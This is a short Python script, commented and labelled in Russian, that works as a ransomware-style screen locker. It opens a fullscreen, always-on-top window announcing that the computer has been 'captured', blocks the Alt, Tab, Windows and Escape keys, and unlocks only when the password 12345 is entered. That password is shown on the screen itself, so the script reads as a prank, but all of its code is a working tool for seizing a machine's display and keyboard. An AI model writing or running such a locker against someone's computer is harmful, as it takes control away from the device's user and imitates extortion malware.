import tkinter as tk
from tkinter import messagebox
import keyboard

def lock_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    
   
    keyboard.block_key("alt")         # Блокируем Alt
    keyboard.block_key("tab")         # Блокируем Tab
    keyboard.block_key("windows")     # Блокируем кнопку Windows
    keyboard.block_key("escape")      # Блокируем Escape
    
    label = tk.Label(root, text="Ваш комп захвачен! Пароль: 12345", 
                     fg="red", bg="black", font=("Arial", 20))
    label.pack(expand=True)
    
    def check_password():
        if entry.get() == "12345":
            
            keyboard.unblock_key("alt")
            keyboard.unblock_key("tab")
            keyboard.unblock_key("windows")
            keyboard.unblock_key("escape")
            root.destroy()
        else:
            messagebox.showerror("Ошибка", "Пароль неверный, давай еще раз!")
    
    entry = tk.Entry(root, show="*")
    entry.pack(pady=20)
    
    button = tk.Button(root, text="Разблокировать", command=check_password)
    button.pack(pady=10)
    
    
    root.bind("<Alt-Tab>", lambda e: "break")
    root.bind("<Escape>", lambda e: "break")
    
    root.mainloop()

lock_screen()